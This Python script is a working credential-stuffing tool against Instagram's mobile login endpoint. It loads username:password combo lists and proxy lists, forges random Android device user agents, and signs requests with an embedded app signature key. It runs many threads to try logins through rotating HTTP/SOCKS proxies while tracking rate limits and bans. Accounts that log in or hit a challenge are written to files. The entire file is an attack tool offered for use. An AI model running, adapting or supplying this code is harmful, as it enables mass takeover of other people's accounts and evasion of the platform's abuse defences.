
import requests,random,threading,os,string,hashlib,urllib,urllib.parse,hmac,json
from queue import Queue

def RandomStringUpper(n = 10):
    letters = string.ascii_uppercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))


def RandomString(n=10):
    letters = string.ascii_lowercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))


def RandomStringUpper(n=10):
    letters = string.ascii_uppercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))


def RandomStringChars(n=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(n))


def randomStringWithChar(stringLength=10):
    letters = string.ascii_lowercase + '1234567890'
    result = ''.join(random.choice(letters) for i in range(stringLength - 1))
    return RandomStringChars(1) + result




class THRIDING():
    def __init__(self, fuc):
        self.TARGET = fuc
        self.threads_list = []

    def Generate_threads(self, Attack):
        for i in range(Attack):
            threads = threading.Thread(target=self.TARGET)
            threads.setDaemon(True)
            self.threads_list.append(threads)
        return self.threads_list

    def started(self):
        for threads_Attack in self.threads_list:
            threads_Attack.start()

    def joined(self):
        for thread_join in self.threads_list:
            thread_join.join()



class Settings:
    def __init__(self):
        self.Que = Queue()
        self.Req = requests.session()
        self.uuid = self.generateUuid()
        self.Lock = threading.Lock()

        self.PRINT = False

        self.Attempts = 0
        self.Rate_limited = 0
        self.Scure = 0
        self.Done = 0
        self.Banned = 0


        self.Combo = open("combo.txt","r").read().splitlines()
        self.proxies = open("proxies.txt","r").read().splitlines()

        self.IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
        self.SIG_KEY_VERSION = '4'

    def generateUSER_AGENT(self):
        Devices_menu = ['HUAWEI', 'Xiaomi', 'samsung', 'OnePlus']
        DPIs = [
            '480', '320', '640', '515', '120', '160', '240', '800'
        ]
        randResolution = random.randrange(2, 9) * 180
        lowerResolution = randResolution - 180
        DEVICE_SETTINTS = {
            'system': "Android",
            'Host': "Instagram",
            'manufacturer': f'{random.choice(Devices_menu)}',
            'model': f'{random.choice(Devices_menu)}-{randomStringWithChar(4).upper()}',
            'android_version': random.randint(18, 25),
            'android_release': f'{random.randint(1, 7)}.{random.randint(0, 7)}',
            "cpu": f"{RandomStringChars(2)}{random.randrange(1000, 9999)}",
            'resolution': f'{randResolution}x{lowerResolution}',
            'randomL': f"{RandomString(6)}",
            'dpi': f"{random.choice(DPIs)}"
        }
        return '{Host} 10.26.0 {system} ({android_version}/{android_release}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {cpu}; {randomL}; en_US)'.format(**DEVICE_SETTINTS)

    def generateUuid(self):
        return requests.get("https://httpbin.org/uuid").text

    def sent_Faster_Request(self,Endpoint, data=None, proxies=None,):
        REQ = requests.session()
        headers = {}
        headers["Connection"] = "keep-alive"
        headers["Accept"] = "*/*"
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["Cookie2"] = "$Version=1"
        headers["Accept-Language"] = "en-US"
        headers["User-Agent"] = self.generateUSER_AGENT()
        REQ.headers.update(headers)
        while 1:
            if proxies != None:
                try:
                    return REQ.post(Endpoint, data=data,proxies=proxies).text
                except:
                    pass
            else:
                return REQ.post(Endpoint, data=data).text

    def generateDeviceId(self,ID):
        volatile_ID = "12345"
        m = hashlib.md5()
        m.update(ID.encode('utf-8') + volatile_ID.encode('utf-8'))
        return 'android-' + m.hexdigest()[:16]

    def generate_Signature(self,data):
        try:
            parsedData = urllib.parse.quote(data)
        except:
            data = json.dumps(data)
            parsedData = urllib.parse.quote(data)
        return ('ig_sig_key_version=' + self.SIG_KEY_VERSION + '&signed_body=' + hmac.new(self.IG_SIG_KEY.encode('utf-8'),data.encode('utf-8'),hashlib.sha256).hexdigest() + '.' + parsedData)




class BRUTE_FORCE:
    def __init__(self):
        self.setting = Settings()
        for i in self.setting.Combo:
            self.setting.Que.put(i)
        self.ask = int(input("[1] http/s - [2] socks4 - [3] socks5 : "))
        self.data = {}


    def save_info(self,username,password):
        return open(f"@{username}.txt","a").write(f"username : {username}\npassword : {password}\n")
    def save_Banned(self,username,password):
        return open(f"@{username} Banned.txt", "a").write(f"username : {username}\npassword : {password}\n")


    def Bruite_Force(self,combo):
        try:
            proxies = random.choice(self.setting.proxies)
            if self.ask == 1:
                erp = {"http": f"{proxies}", "https": f"{proxies}"}
            elif self.ask == 2:
                erp = {"http":"socks4://"f"{proxies}", "https":"socks4://"f"{proxies}"}
            elif self.ask == 3:
                erp = {"http": "socks5://"f"{proxies}", "https":"socks5://"f"{proxies}"}
            username,password = combo.split(":")
        except:
            pass
        self.Request_login(username,password,erp)
        
            




    def Request_login(self,username,password,proxies):

        self.data['guid']= self.setting.uuid
        self.data['enc_password'] = f'#PWD_INSTAGRAM:0:0:{password}'
        self.data['username'] = username
        self.data['device_id'] = "android-psycho@m1c1"
        self.data['login_attempt_count'] = '0'

        Response = self.setting.sent_Faster_Request(Endpoint="https://i.instagram.com/api/v1/accounts/login/",data=self.setting.generate_Signature(self.data),proxies=proxies)

        print(f"\rAttempt : {self.setting.Attempts} / Rate : {self.setting.Rate_limited} / Done : {self.setting.Done} / Scure : {self.setting.Scure} / Banned : {self.setting.Banned}", end="",flush=True)
        if  Response.__contains__("logged_in_user"):
            self.setting.Done += 1
        elif Response.__contains__("challenge_required"):
            self.setting.Scure += 1
            with self.setting.Lock:
                self.save_info(username, password)
        elif Response.__contains__("Please wait a few minutes before you try again."):
            self.setting.Rate_limited += 1
            return self.Bruite_Force(username)
        elif Response.__contains__("checkpoint_logged_out"):
            self.setting.Banned += 1
            with self.setting.Lock:
                print(f"{username} Banned")
                self.save_Banned(username,password)
        else:
            self.setting.Attempts +=1

    def main(self):
        while 1:
            try:
                combo = str(self.setting.Que.get())
                self.Bruite_Force(combo)
                self.setting.Que.task_done()
            except:
                pass

if __name__ == '__main__':
    s = Settings()
    print(f"lenth username : {len(s.Combo)}")
    th = int(input("Threads : "))
    b = BRUTE_FORCE()
    input('Ready? \nIf Ready Click Enter')
    print("\n")
    t = THRIDING(b.main)
    t.Generate_threads(th)
    t.started()
    t.joined()
